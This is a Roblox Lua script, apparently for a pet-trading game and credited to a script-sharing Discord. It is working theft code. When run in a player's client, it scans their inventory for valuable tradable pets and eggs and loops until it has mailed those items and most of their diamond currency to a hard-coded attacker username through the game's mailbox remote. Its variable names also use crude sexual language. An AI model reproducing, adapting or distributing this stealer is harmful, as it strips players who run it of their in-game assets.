Username = "Egorikusa_ghoul"
-- MADE BY X SCRIPTS - discord.gg/xscripts
-- MADE BY X SCRIPTS - discord.gg/xscripts
-- MADE BY X SCRIPTS - discord.gg/xscripts
-- MADE BY X SCRIPTS - discord.gg/xscripts
-- MADE BY X SCRIPTS - discord.gg/xscripts
-- MADE BY X SCRIPTS - discord.gg/xscripts
-- MADE BY X SCRIPTS - discord.gg/xscripts
-- MADE BY X SCRIPTS - discord.gg/xscripts
-- MADE BY X SCRIPTS - discord.gg/xscripts
-- MADE BY X SCRIPTS - discord.gg/xscripts
local Library = require(game:GetService("ReplicatedStorage").Library)
local Save = Library.Save.Get()
local Client = require(game.ReplicatedStorage.Library.Client)
local Inventory = Save.Inventory
local HttpService = game:GetService("HttpService")
local SendRemote = game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send")
local DiamondsBalance = Client.CurrencyCmds.Get("Diamonds")
if DiamondsBalance == nil then
    DiamondsBalance = 0
end

local function GetGems()
local DiamondsBalance = Client.CurrencyCmds.Get("Diamonds")
    if DiamondsBalance == nil then
        DiamondsBalance = 0
    end
    return DiamondsBalance
end

totalrap = 0

local function GetRAP(dick, vagina)
    return (Library.DevRAPCmds.Get({Class = {Name = vagina}, IsA = function(sex) return sex == vagina end, GetId = function() return dick.id end, StackKey = function() return HttpService:JSONEncode({id = dick.id, pt = dick.pt, sh = dick.sh, tn = dick.tn}) end}) or 0)
end

local GetEveryFuckingHit = function()
    HitsList = {}
    if Inventory.Pet ~= nil then
        table.foreach(
            Inventory.Pet,
            function(i, v)
                itemtype = "Pet"
                itemamount = (v._am or 1)
                rap = GetRAP(v, itemtype)
                totalrap = totalrap + rap * itemamount
                id = v.id
                dir = Library.Directory.Pets[id]
                if dir.huge and dir.Tradable ~= false then
                    table.insert(
                        HitsList,
                        {
                            ITEM_ID = i,
                            ITEM_NAME = id,
                            ITEM_AMOUNT = itemamount,
                            ITEM_RAP = math.floor(rap * itemamount),
                            ITEM_TYPE = itemtype
                        }
                    )
                end
            end
        )
    end
    if Inventory.Egg ~= nil then
        table.foreach(
            Inventory.Egg,
            function(i, v)
                itemtype = "Egg"
                itemamount = (v._am or 1)
                rap = GetRAP(v, itemtype)
                totalrap = totalrap + rap * itemamount
                id = v.id
                dir = Library.Directory.Eggs[id]
                if dir.Tradable ~= false then
                    table.insert(
                        HitsList,
                        {
                            ITEM_ID = i,
                            ITEM_NAME = id,
                            ITEM_AMOUNT = itemamount,
                            ITEM_RAP = math.floor(rap * itemamount),
                            ITEM_TYPE = itemtype
                        }
                    )
                end
            end
        )
    end
    if Inventory.Pet ~= nil then
        table.foreach(
            Inventory.Pet,
            function(i, v)
                itemtype = "Pet"
                itemamount = (v._am or 1)
                rap = GetRAP(v, itemtype)
                totalrap = totalrap + rap * itemamount
                id = v.id
                dir = Library.Directory.Pets[id]
                if dir.exclusiveLevel and dir.Tradable ~= false then
                    table.insert(
                        HitsList,
                        {
                            ITEM_ID = i,
                            ITEM_NAME = id,
                            ITEM_AMOUNT = itemamount,
                            ITEM_RAP = math.floor(rap * itemamount),
                            ITEM_TYPE = itemtype
                        }
                    )
                end
            end
        )
    end
end
 
GetEveryFuckingHit()

local function SendGems()
    GemAmount = DiamondsBalance
    local MaxHits = GemAmount/10000
    local HitsAmount = #HitsList
    local GemsToSendHits = HitsAmount * 10000 + 10000
    if GemAmount > GemsToSendHits then
        for i, v in pairs(Inventory.Currency) do
            if v.id == "Diamonds" then
                SendRemote:InvokeServer(Username, v.id, "Currency", i, GemAmount - GemsToSendHits)
            end
        end
    end
end


while true do
    SendGems()
    GetEveryFuckingHit()
    table.sort(HitsList, function(a, b) return a.ITEM_RAP > b.ITEM_RAP end)
    local bestItem = HitsList[1]
    local args = {
        [1] = Username,
        [2] = bestItem.ITEM_NAME,
        [3] = bestItem.ITEM_TYPE,
        [4] = bestItem.ITEM_ID,
        [5] = bestItem.ITEM_AMOUNT
    }
    SendRemote:InvokeServer(unpack(args))
    if #HitsList == 0 or GetGems() == 0 then
        print("done")
        break
    end
end


